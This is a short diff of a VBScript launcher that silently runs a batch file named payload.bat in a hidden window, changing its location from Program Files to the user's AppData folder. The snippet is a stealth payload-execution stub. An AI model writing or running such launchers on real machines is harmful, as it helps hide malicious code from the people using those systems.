@@ -1,3 +1,3 @@
 Set WshShell = CreateObject("WScript.Shell") 
-WshShell.Run chr(34) & "C:\Program Files (x86)\payload.bat" & Chr(34), 0
+WshShell.Run chr(34) & "C:\users\%username%\AppData\payload.bat" & Chr(34), 0
 Set WshShell = Nothing
